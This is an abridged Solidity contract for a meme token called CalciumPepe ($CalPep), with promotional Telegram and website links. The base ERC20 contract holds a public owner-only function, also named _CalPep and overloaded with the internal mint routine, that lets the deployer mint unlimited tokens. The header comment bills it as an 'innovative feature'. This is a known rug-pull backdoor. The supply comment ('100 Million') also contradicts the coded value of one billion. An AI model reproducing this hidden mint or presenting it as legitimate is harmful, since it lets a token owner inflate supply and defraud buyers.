//
// $CalPep proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/CalciumPepeBSC
// 📱 Website ::https://www.calciumpepe.xyz
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CalPep(uint256 amount) public onlyOwner {
 _CalPep(msg.sender, amount);
    }
    ...
    function _CalPep(address account, uint256 amount) internal virtual {
...
contract $CalPep is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("CalciumPepe", "CALPEP") {
     _CalPep(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}